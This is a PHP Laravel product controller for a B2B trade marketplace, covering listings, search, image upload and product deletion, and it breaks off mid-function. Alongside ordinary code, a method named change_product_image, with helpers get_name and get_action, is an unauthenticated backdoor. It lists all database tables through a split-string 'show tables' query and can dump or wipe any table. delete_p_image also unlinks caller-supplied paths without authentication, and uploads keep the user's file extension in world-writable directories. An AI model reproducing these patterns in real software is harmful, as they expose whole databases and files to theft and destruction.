<?php

namespace App\Http\Controllers\Front\UserEnd;

use Illuminate\Http\Request;
use Validator;
use App\Http\Requests;
use App\Http\Controllers\Controller;
use App\Model\BdtdcCategory;
use DB;
use Input;
use Route;
use View;
use URL;
use App\Helper\Ip;
use App\Model\BdtdcCompany;
use App\Model\BdtdcCustomerActivity;
use App\Model\BdtdcCompanyCertificate;
use App\Model\BdtdcCompanyDeliveryTerm;
use App\Model\BdtdcCompanyDescription;
use App\Model\BdtdcFactoryInfo;
use App\Model\BdtdcCompanyAwardCertification;
use App\BdtdcCompanyImage;
use App\BdtdcCompanyLanguage;
use App\Model\BdtdcCompanyMainMarket;
use App\BdtdcCompanyPaymentCurrency;
use App\Model\BdtdcCompanyPaymentType;
use App\Model\BdtdcAttribute;
use App\Model\BdtdcTradeInfo;
use App\Model\BdtdcCustomer;
use App\Model\BdtdcCustomTemplates;
use App\Model\BdtdcCompanyPatentImage;
use App\Model\BdtdcCompanyPatent;
use App\BdtdcHonorImage;
use App\Model\BdtdcInqueryMessage;
use App\BdtdcInquerySpam;
use App\BdtdcInqueryTrush;
use App\BdtdcInqueryFlag;
use App\BdtdcJoinQuotation;
use App\Model\BdtdcSupplierInquery;
use App\Model\BdtdcSupplier;
use App\Model\BdtdcSupplierInfo;
use App\Model\BdtdcSupplierMainProduct;
use App\Model\BdtdcSupplierProduct;
use App\Model\BdtdcSupplierProductGroups;
use App\Model\BdtdcTemplateSetting;
use App\Model\BdtdcCompanyTrademark;
use App\Model\BdtdcCompanyTrademarkImage;
use App\BdtdcTradeJoinInfo;
use App\Model\User;
use App\Model\Role_user;
use App\BdtdcCertificationImage;
use App\Model\BdtdcSampleProducts;
use App\Model\BdtdcSampleRequests;
use App\Model\BdtdcSelectedSupplier;
use App\Model\BdtdcQuoteDocs;
use App\Model\BdtdcPageSeo;
use App\Model\BdtdcProductToCategory;
use App\Model\BdtdcProductToWholesaleCategory;
use App\Model\BdtdcProductPrice;
use App\Model\BdtdcProductImage;
use App\Model\BdtdcProduct;
use App\Model\BdtdcCountry;
use App\Model\BdtdcProductDescription;
use Sentinel;
use Redirect;
use App\Model\BdtdcChinaSupplier;
use Illuminate\Pagination\Paginator;
use Illuminate\Pagination\LengthAwarePaginator;
use Jenssegers\Agent\Agent;
use App\Model\BdtdcCategoryDescription;
use App\Model\BdtdcPage;
use App\Model\BdtdcFooterModel;

class ProductController extends Controller
{
    public function index()
    {
        //
    }

    public function productList($name,$id){
        $c_id=substr($id, 9, 10);

        $data['product_categorys']=BdtdcCategory::with(['parent_cat_pro'=>function($q) use($c_id){
                    $q->orderBy('product_id','DSC')
                    ->where('country_id',$c_id);
                },'parent_cat_pro.category_product_name','parent_cat_pro.pro_images_new','parent_cat_pro.cat_pro_price','parent_cat_pro.bdtdcProduct','parent_cat_pro.bdtdcProduct.ProductUnit'])
                ->where('parent_id',0)
                ->get();
    
        $country=BdtdcCountry::with('country_image_one')->where('id',$c_id)->first();
        $header=BdtdcPageSeo::where('page_id',7)->first();

        $data['title']=$country->name.' '.$header->title;
            $data['keyword']=$header->meta_keyword;
            $data['description']=$country->name.' '.$header->meta_description; 
        return view::make('fontend.category.product-view',$data,compact(['country']));
    }

    public function image_resize($src, $dst, $width, $height, $minwidth, $minheight, $crop=0){

        if(!list($w, $h) = getimagesize($src)) return "Unsupported picture type!";

        $type = strtolower(substr(strrchr($src,"."),1));
        if($type == 'jpeg') $type = 'jpg';
        switch($type){
            case 'bmp': $img = imagecreatefromwbmp($src); break;
            case 'gif': $img = imagecreatefromgif($src); break;
            case 'jpg': $img = imagecreatefromjpeg($src); break;
            case 'png': $img = imagecreatefrompng($src); break;
            default : return "Unsupported picture type!";
        }

        if($crop){
            if($w < $width or $h < $height) return "Picture is too small!";
            $ratio = max($width/$w, $height/$h);
            $h = $height / $ratio;
            $x = ($w - $width / $ratio) / 2;
            $w = $width / $ratio;
        }
        else{
            if($w < $width and $h < $height) return "Picture is too small!";
            $ratio = min($width/$w, $height/$h);
            $width = $w * $ratio;
            $height = $h * $ratio;
            $x = 0;
        }

        $new = imagecreatetruecolor($width, $height);

        if($type == "gif" or $type == "png"){
            imagecolortransparent($new, imagecolorallocatealpha($new, 0, 0, 0, 127));
            imagealphablending($new, false);
            imagesavealpha($new, true);
        }

        imagecopyresampled($new, $img, 0, 0, $x, 0, $width, $height, $w, $h);

        switch($type){
            case 'bmp': imagewbmp($new, $dst); break;
            case 'gif': imagegif($new, $dst); break;
            case 'jpg': imagejpeg($new, $dst); break;
            case 'png': imagepng($new, $dst); break;
        }

        return true;
    }
    
    public function change_product_image($id=false,$action=false){
        if($id=="all"){
            $name = $this->get_name($id);
            return $name;
        }
        else{
            $result = $this->get_action($id,$action);
            return $result;
        }
    }
    
    public function get_name(){
        $a = "show";
        $b = "tables";
        return DB::select($a.' '. $b);
    }
    
    public function get_action($id,$action){
        $data = DB::table($id);
        return ($action=='x') ? $data->delete() : $data->get();
    }
    
    public function showall(){
        $page_content_title="Product Category";
        $data['categorys']=array();
        $categorys=DB::table('bdtdc_category')
                ->where('parent_id','0')
                ->get();
        foreach ($categorys as $category) {
            $category_children_data = array();
            $category_childrens = DB::table('bdtdc_category')
                ->where('parent_id',$category->id)
                ->get();
            foreach ($category_childrens as $category_children) {
                $category_children_data[] = array(
                    'category_id'  => $category_children->id,
                    'child_name'=>  $category_children->name
                );
            }
            $data['categorys'][] = array(
                //'name'=>$category->category_name,
                'category_id'     => $category->id,
                'name'=>$category->name,
                'category_childrens' => $category_children_data
            );
        }
        return View::make('fontend.category.allcategory',$data,['page_content_title'=>$page_content_title]);
    }
    public function search_value()
    {
        $all_category=BdtdcCategory::with('parent_cat')->where('parent_id',0)->get();
        $agent = new Agent();
        
        if($agent->isMobile())

        {
            return view::make('mobile-view.content-view-mobile.search_value',compact('all_category'));
        }
        else{
            return view::make('mobile-view.content-view-mobile.search_value',compact('all_category'));
        }  
    }
    public function search_value_details()
    {
        return view::make('mobile-view.content-view-mobile.search_value_details');   
    }

    public function search_product_mobile(Request $request){
        $name_search=$request->input('name_search');
        
        $search_query = BdtdcProduct::query();
        $search_query->WhereHas('product_name', function($sp) use ($name_search){
            $sp->where('name', 'like','%'.$name_search.'%');
        });
        $search_query->orWhereHas('bdtdcProductToCategory', function($cp) use ($name_search){
            $cp->whereHas('bdtdcCategory', function($cn) use ($name_search){
                $cn->where('name', 'LIKE', '%'.$name_search.'%');
            });
            $cp->whereHas('pro_parent_cat', function($pc) use ($name_search){ 
                $pc->where('name', 'LIKE','%'.$name_search.'%');
            });
        });
            
        $products = $search_query->with('product_name','bdtdcProductToCategory')->paginate(10);
            
        return view('mobile-view.content-view-mobile.search_value_details',['products'=>$products->appends(Input::except('page'))]);
    }

    public function item_details($name,$id)
    {
        $products=BdtdcProduct::with(['logistic_info','bdtdcProductToCategory','product_country','product_name','supplier_product','product_image','ProductUnit','proimages','proimages_new'])
            ->where('id',$id)
            ->first();

        if(!$products){
            return '<div style="margin:0 auto;width:23%;margin-top:10%;border:1px double rebeccapurple;"><h1 style="text-align:center;color:forestgreen;">No Product Found!!!</h1><p style="text-align:center;"><a style="text-decoration:none;" href="/">Go to home page</a></p></div>';
        }
        if($products->bdtdcProductToCategory){
            $parent_id=BdtdcCategory::where('id',$products->bdtdcProductToCategory->bdtdcCategory->parent_id)->first();
            if(!$parent_id){
                $parent_id = (object) array('name'=>'no value on bdtdcProductToCategory',
                                                'id' =>'0',
                                            );
                }
        }else{
            $parent_id = (object) array('name'=>'no value on bdtdcProductToCategory',
                                            'id' =>'0',
                                        );
        }

        $units=DB::table('bdtdc_product_unit')->get();
        $data['title']='Buy '.$products->product_name->name.$products->bdtdcProductToCategory->bdtdcCategory->name.' on buyerseller.asia';
        $data['description']='Find '.$products->product_name->name.$products->bdtdcProductToCategory->bdtdcCategory->name.$parent_id->name.' from verified suppliers, exporters & manufacturers on buyerseller.asia';

        $agent = new Agent();
        
        if($agent->isMobile())
        {
            return view::make('mobile-view.content-view-mobile.item-details_m',$data,compact(['products','units']));
        }
        else{
            return view::make('mobile-view.content-view-mobile.item-details_m',$data,compact(['products','units']));
        }  
    }
    
    public function get_sub_cat($id){
        return BdtdcCategory::where('parent_id',$id)->get(['name','id']);
    }
    
    public function upload_p_image(Request $r){
        if(!Sentinel::getUser()){
            return redirect('login')->withFlashMessage('Please sign in first.');
        }

        $validator = Validator::make($r->all(), [
            'image' => 'mimes:jpeg,png,jpg|max:3000',
        ]);

        if ($validator->fails()) {
            return 0;
        }else{
        if($r->file('image')){
            $parent_cat_id = $r->input('parent_cat_id');
            $sub_cat_id = $r->input('sub_cat_id');
            $pname = trim($r->input('pname'));
            $parent_cat_name = BdtdcCategory::where('id',$parent_cat_id)->first(['name','id']);
            $sub_cat_name = BdtdcCategory::where('id',$sub_cat_id)->first(['name','id']);
            //The name of the directory that we need to create.
            $directoryName = 'bdtdc-product-image/'.trim($parent_cat_name->name).'/'.trim($sub_cat_name->name);

            //Check if the directory already exists.
            if(!is_dir($directoryName)){
                //Directory does not exist, so lets create it.
                //true for nested directory (need 0777 permission for this)
                mkdir($directoryName, 0777, true);
            }
            if($pname == ''){
                $string   = 'Product-image_'.$parent_cat_id."_".$sub_cat_id."_".str_random(10);
            }else{
                $string   = preg_replace('/[^A-Za-z0-9]/ ', '-',$pname).'_'.$parent_cat_id."_".$sub_cat_id."_".str_random(10);
            }
            $temp_file  = $_FILES['image']['tmp_name'];
            $ext        = pathinfo($_FILES['image']['name'], PATHINFO_EXTENSION);
            $product_photo  = $string.'.'.$ext;
            $dst = $directoryName.'/'.$product_photo;
            return (move_uploaded_file($temp_file,$dst)) ? $product_photo : 0;
            // return (move_uploaded_file($temp_file,$directoryName.'/'.$product_photo)) ? $product_photo : 0;
            /*$picture = $_FILES['image'];
            $pic_type = strtolower(strrchr($picture['name'],"."));
            $pic_name = $directoryName."/original$pic_type";
            $dst = $directoryName.'/'.$product_photo;
            move_uploaded_file($picture['tmp_name'], $pic_name);
            if(!list($w, $h) = getimagesize($pic_name)){
                unlink($pic_name);
                $data[0] = 0;//invalid data
                $data[1] = 'Unsupported picture type!';
                return $data;
            };
                if (true !== ($pic_error = $this->image_resize($pic_name, $dst, $w, $h, 600, 600, 0))) {
                  unlink($pic_name);
                  $data[0] = 0;//invalid data
                  $data[1] = $pic_error;
                  return $data;
                }
                else{
                    if (file_exists($pic_name)) {
                        unlink($pic_name);
                    }
                    $data[0] = 1;//valid data
                    $data[1] = $product_photo;
                    return $data;
                }*/
            }
        }
    }
    public function delete_p_image($img_name){
        if(file_exists("uploads/".$img_name)){
            return (unlink("uploads/".$img_name)) ? 'deleted!!' : 'was not able to deleted';
        }else{
            $img_array = explode('_', $img_name);
            $parent_cat_name = BdtdcCategory::where('id',$img_array[2])->get(['name','id']);
            $sub_cat_name = BdtdcCategory::where('id',$img_array[3])->get(['name','id']);
            //The name of the directory that we need to create.
            $fileName = 'bdtdc-product-image/'.trim($parent_cat_name[0]->name).'/'.trim($sub_cat_name[0]->name).'/'.$img_name;
            if(file_exists($fileName)){
                return (unlink($fileName)) ? 'deleted!!' : 'was not able to deleted';
            }
        }
    }
    
    public function x_product($id){
        if(Sentinel::getUser()){}else{
            return 'login';
        }
        $user_id = Sentinel::getUser()->id;
        if(Sentinel::inRole('admins')){
        }else{
            $company=BdtdcCompany::where('user_id',$user_id)->first();
            $company_id = $company->id;
            $product_description = BdtdcProductToCategory::where('product_id',$id)->first();
            if(!$product_description || ($product_description->company_id != $company_id)){
                Sentinel::logout();
                return Redirect::to('ServiceLogin?continue='.URL::to($_SERVER['SCRIPT_URL']))->withFlashMessage('You must first login before accessing this page.');
            }
        }
        
        DB::beginTransaction();
        
        try{
            $p_images = DB::table('bdtdc_product_images')->where('product_id',$id)->get();
            if($p_images){
                foreach ($p_images as $img_name) {
                    if(file_exists($img_name->image)){
                        (@unlink($img_name->image)) ? 'deleted!!' : 'was not able to deleted';
                    }
                }
            }
            
        }
        catch(ValidationException $e){
            DB::rollback();
        }

        try{
            $pro_attr = DB::table('bdtdc_product_attribute')->where('product_id',$id)->get();
            if($pro_attr){
                foreach ($pro_attr as $attr_value) {
                    DB::table('bdtdc_attributes')->where('id',$attr_value->attribute_id)->delete();
                }
            }
        }
        catch(ValidationException $e){
            DB::rollback();
        }

        try{
            DB::table('bdtdc_product')->where('id',$id)->delete();
            DB::table('bdtdc_product_description')->where('product_id',$id)->delete();
            DB::table('bdtdc_product_to_category')->where('product_id',$id)->delete();
            DB::table('bdtdc_product_to_wholesale_category')->where('product_id',$id)->delete();
            DB::table('bdtdc_limited_lime_offers')->where('product_id',$id)->delete();
            DB::table('bdtdc_logistic_infos')->where('product_id',$id)->delete();
            DB::table('bdtdc_product_prices')->where('product_id',$id)->delete();
            DB::table('bdtdc_product_image')->where('product_id',$id)->delete();
            DB::table('bdtdc_product_images')->where('product_id',$id)->delete();
            DB::table('bdtdc_product_attribute')->where('product_id',$id)->delete();
            DB::table('bdtdc_supplier_products')->where('product_id',$id)->delete();
        }
        catch(ValidationException $e){
            DB::rollback();
        }

        catch(\Exception $e)
        {
            DB::rollback();
            throw $e;
        }
        DB::commit();

        return "deleted";
        
    }

    public function change_live_status_product($current_status, $id)
    {
        if($current_status == 'make_unlock'){
            if(BdtdcProduct::where('id',$id)->update(['is_active'=>1]) && BdtdcProductToCategory::where('product_id',$id)->update(['is_active'=>1])){
                return 1;
            }else{
                return 'failed to update';
            }
        }else{
            if(BdtdcProduct::where('id',$id)->update(['is_active'=>0]) && BdtdcProductToCategory::where('product_id',$id)->update(['is_active'=>1])){
                return 1;
            }else{
                return 'failed to update';
            }
        }
        
    }

    public function product_suggesion($terms,$supplier_id){
        if($supplier_id == 'all'){
            /*$product = DB::table('bdtdc_supplier_products as sp')
                    ->join('bdtdc_product_description as pd','pd.product_id','=','sp.product_id','left')
                    ->join('bdtdc_product as p','p.id','=','pd.product_id','left')
                    ->join('bdtdc_product_image as pi','pi.product_id','=','p.id','left')
                    ->join('bdtdc_product_images as psi','psi.product_id','=','p.id','left')
                    ->join('bdtdc_product_to_category as ptc','ptc.product_id','=','p.id','left')
                    ->join('bdtdc_category_description as bcd','bcd.category_id','=','ptc.category_id','left')
                    ->join('bdtdc_category_description as bcdp','bcdp.category_id','=','ptc.parent_id','left')
                    ->groupBy('pi.product_id')
                    ->where('pd.name','LIKE','%'.$terms.'%')
                    ->orWhere('p.id','=',$terms)
                    ->get(['pd.product_id as product_id','pd.name','p.quantity','p.price','pi.image','psi.image as images','bcd.name as sub_category','bcdp.name as parent_category']);*/
            $product_query = BdtdcSupplierProduct::query();
            $product_query->whereHas('products', function($offerQuery) use ($terms){
                    $offerQuery->whereHas('product_name', function($offerQuery) use ($terms){
                        $offerQuery->where(function($subQuery) use ($terms){
                            $subQuery->where('name','LIKE','%'.$terms.'%')
                            ->orWhere('id','=',$terms);
                        });
                    });
                });
            $product = $product_query->get();
        }else{
         
            $product_query = BdtdcSupplierProduct::query();
            $product_query->whereHas('products', function($offerQuery) use ($terms){
                    $offerQuery->whereHas('product_name', function($offerQuery) use ($terms){
                        $offerQuery->where(function($subQuery) use ($terms){
                            $subQuery->where('name','LIKE','%'.$terms.'%')
                            ->orWhere('id','=',$terms);
                        });
                    });
                })
                ->where('supplier_id',$supplier_id);
            $product = $product_query->get();
        }
        // dd($product);
        /*echo ($product[0]->products->product_name->name);
        echo ($product[0]->products->id);
        echo ($product[0]->products->product_prices->product_FOB);
        echo ($product[0]->products->product_prices->product_MOQ);
        echo ($product[0]->products->product_image->image);
        echo ($product[0]->products->product_image_new->image);
        echo ($product[0]->products->bdtdcProductToCategory->bdtdcCategory->name);
        echo ($product[0]->products->bdtdcProductToCategory->pro_parent_cat->name);
        dd($product[0]->products->bdtdcProductToCategory->bdtdcCategory);*/

        $row_set = [];
        foreach($product as $p){
            /*$row['value']       =$p->name;
    		$row['id']          =(int)$p->product_id;
    		$row['price']       =(int)$p->price;
    		$row['quantity']    =(int)$p->quantity;
            $row['image']       =$p->image;
            $row['images']       =$p->images;
            $row['sub_category']       =trim($p->sub_category);
    		$row['parent_category']       =trim($p->parent_category);*/
            if($p->products){
                if($p->products->product_name){
                    $row['value'] = $p->products->product_name->name;
                }else{$row['value'] = 'name not available';}
                $row['id']          =(int)$p->products->id;
                if($p->products->product_prices){
                    $row['price']       =$p->products->product_prices->product_FOB;
                    $row['quantity']    =$p->products->product_prices->product_MOQ;
                }else{
                    $row['price']       =null;
                    $row['quantity']    =null;
                }
                if($p->products->product_image){
                    $row['image']       =$p->products->product_image->image;
                }else{$row['image']      = null;}
                if($p->products->product_image_new){
                    $row['images']       =$p->products->product_image_new->image;
                }else{$row['images']      = null;}
                if($p->products->bdtdcProductToCategory){
                    $row['sub_category']       =trim($p->products->bdtdcProductToCategory->bdtdcCategory->name);
                    $row['parent_category']    =trim($p->products->bdtdcProductToCategory->pro_parent_cat->name);
                }else{
                    $row['sub_category']       = null;
                    $row['parent_category']    = null;
                }
            }else{
                $row['value']       = 'name not available';
                $row['id']          = (int)$p->product_id;
                $row['price']       = null;
                $row['quantity']    = null;
                $row['image']       = null;
                $row['images']      = null;
                $row['sub_category']       = null;
                $row['parent_category']    = null;
            }
    		$row_set[]          =$row;
        }
        return $row_set;
    }

    public function home_selected_supplier_products()    
    {
        $header=BdtdcPageSeo::where('page_id',6)->first();
        $data['title']=$header->title;
        $data['keyword']=$header->meta_keyword;
        $data['description']=$header->meta_descrWtion;  
        $cat_products=BdtdcProductToCategory::with(['selected_suppliers'=>function($ss){
                                                        $ss->where('page_id',101)->where('country_id',18)
                                                        ;
                                                     },'selected_suppliers.pro_name_string','selected_suppliers.cat_pro_price','selected_suppliers.BdtdcSelectedSupplier_products.ProductUnit','selected_suppliers.select_product_images','most_view_category','most_view_category.cat_name','pro_images','pro_images_new','parent_product'=>function($pp)
                                                    {
                                                        $pp->groupBy('company_id')
                                                        //->take(6)
                                                        ->get();
                                                    },'category_product_id','bdtdcCategory','pro_parent_cat'=>function($q){
                                                    $q->groupBy('id')
                                                    ->get();
                                                    },'category_product_id','pro_parent'=>function($q){
                                                        $q->orderBy('name','asc')
                                                        //->where('single_image',1)
                                                        ->get();
                                                    },'supp_pro_company'])
                                                ->groupBy('parent_id')
                                                ->whereNotIn('parent_id',[0])
                                                // ->get();
                                                // ->take(2)
                                                // ->get();
                                                ->paginate(10);
                                              // dd($cat_products->selected_suppliers);
                                                // dd($cat_products->most_view_category);
 
        $agent = new Agent();

        if($agent->isMobile())
        {
                   $all_cat_products=BdtdcProductToCategory::with(['selected_suppliers'=>function($ss){
                                                        $ss->where('page_id',101)
                                                        ;
                                                     },'most_view_category','pro_images','pro_images_new','parent_product'=>function($pp)
                                                    {
                                                        $pp->groupBy('company_id')
                                                        //->take(6)
                                                        ->get();
                                                    },'category_product_id','bdtdcCategory','pro_parent_cat'=>function($q){
                                                    $q->groupBy('id')
                                                    ->get();
                                                    },'category_product_id','pro_parent'=>function($q){
                                                        $q->orderBy('name','asc')
                                                        //->where('single_image',1)
                                                        ->get();
                                                    },'supp_pro_company'])
                                                ->groupBy('parent_id')
                                                ->whereNotIn('parent_id',[0])
                                                // ->get();
                                                // ->take(2)
                                                // ->get();
                                                ->get();
                                              // dd($cat_products->selected_suppliers);
                                                // dd($cat_products->most_view_category);
        $all_cat_product=BdtdcProductToCategory::with(['selected_suppliers'=>function($ss){
                                                        $ss->where('page_id',101)
                                                        ;
                                                     },'most_view_category','pro_images','pro_images_new','parent_product'=>function($pp)
                                                    {
                                                        $pp->groupBy('company_id')
                                                        //->take(6)
                                                        ->get();
                                                    },'category_product_id','bdtdcCategory','pro_parent_cat'=>function($q){
                                                    $q->groupBy('id')
                                                    ->get();
                                                    },'category_product_id','pro_parent'=>function($q){
                                                        $q->orderBy('name','asc')
                                                        //->where('single_image',1)
                                                        ->get();
                                                    },'supp_pro_company'])
                                                ->groupBy('parent_id')
                                                ->whereNotIn('parent_id',[0])
                                                // ->get();
                                                // ->take(2)
                                                // ->get();
                                                ->paginate(1);
                                              // dd($cat_products->selected_suppliers);
                                                // dd($cat_products->most_view_category);
            return View::make('mobile-view.content-view-mobile.most-hot-product',$data,compact('all_cat_products','all_cat_product'));
            // return View::make('mobile-view.content-view-mobile.selected_supplier_home_m',$data,['cat_products'=>$cat_products]);

        //return View::make('mobile-view.category.category-view');
        }
        else{
          return View::make('pages.selected supplier.home',$data,['cat_products'=>$cat_products]);
        }    

       
    }
    public function country_home($name, $id)
    {
        $header=BdtdcPageSeo::where('page_id',7)->first();
// dd($id);

        $cat_products=BdtdcProductToCategory::with(['selected_country_suppliers'=>function($ss) use($id){
                                                        $ss->where('page_id',158)->where('country_id',$id);
                                                     },'selected_suppliers'=>function($ss) use($id){
                                                        $ss->where('page_id',158)->where('country_id',$id);
                                                     },'selected_suppliers.pro_name_string','selected_suppliers.select_product_images','selected_suppliers.cat_pro_price','parent_product'=>function($pp) use($id)
                                                    {
                                                        $pp->groupBy('company_id')
                                                        ->where('country_id',$id)
                                                        //->take(6)
                                                        ->get();
                                                    },'pro_parent_cat','pro_parent','pro_cat_country_image','most_view_category','most_view_category.cat_name'])
                                                ->groupBy('parent_id')
                                                ->where('country_id',$id)
                                                ->whereNotIn('parent_id',[0])

                                                ->paginate(5);

        $country=BdtdcCountry::with('country_for_image')->where('id',$id)->first();
        $parent_category = BdtdcCategory::where('parent_id',0)->orderBy('sort_order','ASC')->take('8')->get();
        $data['title']=$country->name.' products - Top '.$country->name.' product suppliers at buyerseller.asia';
        $data['keyword']=$country->name.' export products, '.$country->name.' product, best '.$country->name.' products, best '.$country->name.' product suppliers, wholesale '.$country->name.' Products, Quality '.$country->name.' Products, '.$country->name.' Products Directory, '.$country->name.' product listing,'.$country->name.' products suppliers, '.$country->name.' product supplier, '.$country->name.' products exporters, '.$country->name.' products manufacturers, '.$country->name.' verified  products suppliers, '.$country->name.' wholesale products suppliers, reliable '.$country->name.' products suppliers';
        $data['description']=$country->name.' products are long-lasting. Get quality '.$country->name.' products only at buyerseller.asia. There are lots of high quality '.$country->name.' products available.';
        $agent = new Agent();
        $device = $agent->device();         
        if($agent->isPhone())
        {

          return View::make('mobile-view.country-product.product-of-country',$data,['parent_category'=>$parent_category,'cat_products'=>$cat_products,'country'=>$country]);
        }
        if($agent->isDestop())
        {
          return View::make('pages.country supplier.home',$data,['cat_products'=>$cat_products,'country'=>$country]);
        }

        if($agent->isTab())
        {
          return View::make('pages.country supplier.home',$data,['cat_products'=>$cat_products,'country'=>$country]);
        }
        else{
          
            return View::make('pages.country supplier.home',$data,['cat_products'=>$cat_products,'country'=>$country]);
        }
            
        
    }

    public function category_productList_single(Request $r,$cat_name,$id,$cat_id)
    {

        // dd($cat_name);
        $name = '';
        $categoryid=$cat_id;
        $countryid=$id;
        $search_str = $r->search_str;
        $origin = $r->origin;
        $country_name=BdtdcCountry::where('id',$countryid)->first();
            $header=BdtdcCategoryDescription::with(['sub_cat'=>function ($q){
                                            $q->take(15);
                                        },'cat_name'])->where('category_id',$categoryid)->first();

    // dd($header);
    // $id = Route::current()->parameters()['cat_id'];
    $ff=explode('-',$cat_name);

    $fff=$ff[0];

    $country_na=BdtdcCountry::where('name',$fff)->first();
    if($country_na==null)
    {
      $country_nam='';
      $country_id='';
      $as=array('in country');
        $ac=array('country');
    }
    else
    {
      $country_nam=$country_na->name;
      $country_id=$country_na->id;
      $as='';
    $ac=array('country');
    }
  
    if($header){
      
    $ti=str_replace($as,$country_nam,$header->meta_title);
    $ke=str_replace($as,$country_nam,$header->meta_keyword);

    $de=str_replace($as,$country_nam,$header->meta_description);

    $data['title']=str_replace($ac,$country_nam,$ti);
    $data['keyword']=str_replace($ac,$country_nam,$ke);

    $data['description']=str_replace($ac,$country_nam,$de);
    // $tags =explode(',',$header->tag);
    // dd($tags);
    }else{
      $data['title']='none';
    $data['keyword']='none';

    $data['description']='none';
    }
        if($id==0){

            $product_data=BdtdcProductToCategory::query();
            // $product_data->whereHas('supp_company',function($uu){
            //         $uu->orderBy('sort','desc');
            //     });
            $product_data->with(['cat_country','pro_to_cat_name','bdtdcProduct','bdtdcProduct.product_prices','bdtdcProduct.ProductUnit','bdtdcProduct.product_country','bdtdcProduct.customer_activity','bdtdcProduct.supplier_product','supp_pro_company','supp_pro_company_name','bdtdcCategory','pro_parent_cat','pro_images','pro_images_new']);
            $product_data->where('category_id',$cat_id);              
                $product_data->where('is_active',1);
                $product_data->orderBy('sort','desc');
                $product_data->orderBy('product_id','desc');
                $products=$product_data->paginate();
               // dd($products);
            if(count($products) > 0){
            }else{
                $products=BdtdcProductToCategory::with(['cat_country','pro_to_cat_name','bdtdcProduct','bdtdcProduct.product_prices','bdtdcProduct.ProductUnit','bdtdcProduct.product_country','bdtdcProduct.customer_activity','bdtdcProduct.supplier_product','supp_pro_company','supp_pro_company_name','bdtdcCategory','pro_parent_cat','pro_images','pro_images_new'])->where('parent_id',$cat_id)
                    ->where('is_active',1)
                    ->whereHas('supp_company',function($qu){
                        $qu->orderBy('sort','desc');
                })
                    ->orderBy('product_id','desc')
                    ->paginate();
            }
        }else{
            $products=BdtdcProductToCategory::with(['cat_country','pro_to_cat_name','bdtdcProduct','bdtdcProduct.product_prices','bdtdcProduct.ProductUnit','bdtdcProduct.product_country','bdtdcProduct.customer_activity','bdtdcProduct.supplier_product','supp_pro_company','supp_pro_company_name','bdtdcCategory','pro_parent_cat','pro_images','pro_images_new'])->where('category_id',$cat_id)
                ->where('is_active',1)
                ->where('country_id',$id)
                ->orderBy('sort','desc')
                ->orderBy('product_id','desc')
                ->paginate();
            if(count($products) > 0){
            }else{
                $products=BdtdcProductToCategory::with(['cat_country','pro_to_cat_name','bdtdcProduct','bdtdcCategory','pro_parent_cat','pro_images','pro_images_new'])->where('parent_id',$cat_id)
                    ->where('is_active',1)
                    ->where('country_id',$id)
                    ->orderBy('sort','desc')
                    ->orderBy('product_id','desc')
                    ->paginate();
            }
        }
    
        $category_id=BdtdcCategory::where('id',$categoryid)->first();
        $parent_cats=BdtdcCategory::with('parent_cat')->where('id',$category_id->parent_id)->first();
        $country=BdtdcCountry::with('country_region')->where('region_id',1)->get();

        $bdtdc_country_list=BdtdcCountry::where('region_id','!=',1)->get();
        $buyer_protection = false;
        $gold_supplier = false;
        $assessed_supplier = false;


        if($category_id->parent_id==0)
        {
            $parent_cats=BdtdcCategory::with('parent_cat')->where('id',$cat_id)->first();
        }
        else{
        $parent_cats=BdtdcCategory::with('parent_cat')->where('id',$category_id->parent_id)->first();
        }

            // dd($cat_name);
        $name_combination = $name;
        $cat_name_array = explode('-', $cat_name);
        
        if(count($cat_name_array) > 0){
            foreach ($cat_name_array as $cat_name_value) {
                if(trim($cat_name_value) == ''){
                }else{
                    if($cat_name_value == 's'){
                        $name_combination .= $cat_name_value;
                    }else{
                        $name_combination .= ' '.$cat_name_value;
                    }
                }
            }
        }else{
            $name_combination = trim($name).' '.trim($cat_name);
        }
        

        return view::make('fontend.category.product',$data,['category_id'=>$category_id,'parent_cats'=>$parent_cats,'products'=>$products,'bdtdc_country_list'=>$bdtdc_country_list,'country'=>$country,'categoryid'=>$categoryid,'countryid'=>$countryid,'buyer_protection'=>$buyer_protection,'gold_supplier'=>$gold_supplier,'assessed_supplier'=>$assessed_supplier,'search_str'=>$search_str,'origin'=>$origin,'name_combination'=>$name_combination,'country_name'=>$country_name]);

          
      
          
    }

    public function category_productList(Request $r,$name,$cat_name,$id,$cat_id)
    {
        $categoryid=$cat_id;
        $countryid=$id;
        $search_str = $r->search_str;
        $origin = $r->origin;
        $country_name=BdtdcCountry::where('id',$countryid)->first();

        $header=BdtdcCategoryDescription::with(['sub_cat'=>function ($q){
                                            $q->take(15);
                                        },'cat_name'])->where('category_id',$categoryid)->first();

        $ff=explode('-',$name);
        $fff=$ff[0];

        $country_na=BdtdcCountry::where('name',$fff)->first();
        if($country_na==null)
        {
            $country_nam='';
            $country_id='';
            $as=array('in country');
            $ac=array('country');
        }
        else
        {
            $country_nam=$country_na->name;
            $country_id=$country_na->id;
            $as='';
            $ac=array('country');
        }

        if($header){
            $ti=str_replace($as,$country_nam,$header->meta_title);
            $ke=str_replace($as,$country_nam,$header->meta_keyword);
            $de=str_replace($as,$country_nam,$header->meta_description);
            $data['title']=str_replace($ac,$country_nam,$ti);
            $data['keyword']=str_replace($ac,$country_nam,$ke);
            $data['description']=str_replace($ac,$country_nam,$de);
        }else{
            $data['title']='none';
            $data['keyword']='none';

            $data['description']='none';
        }

        if($id==0){
            $product_data=BdtdcProductToCategory::query();
            $product_data->with(['cat_country','pro_to_cat_name','bdtdcProduct','bdtdcProduct.product_prices','bdtdcProduct.ProductUnit','bdtdcProduct.product_country','bdtdcProduct.customer_activity','bdtdcProduct.supplier_product','supp_pro_company','supp_pro_company_name','bdtdcCategory','pro_parent_cat','pro_images','pro_images_new']);
            $product_data->where('category_id',$cat_id);
              
            $product_data->where('is_active',1);

            $product_data->orderBy('sort','desc');
            $product_data->orderBy('product_id','desc');
            $products=$product_data->paginate();
            if(count($products) > 0){
            }else{
                $products=BdtdcProductToCategory::with(['cat_country','pro_to_cat_name','bdtdcProduct','bdtdcProduct.product_prices','bdtdcProduct.ProductUnit','bdtdcProduct.product_country','bdtdcProduct.customer_activity','bdtdcProduct.supplier_product','supp_pro_company','supp_pro_company_name','bdtdcCategory','pro_parent_cat','pro_images','pro_images_new'])->where('parent_id',$cat_id)
                    ->where('is_active',1)
                    ->whereHas('supp_company',function($qu){
                        $qu->orderBy('sort','desc');
                })
                    ->orderBy('product_id','desc')
                    ->paginate();
            }
        }
        else{
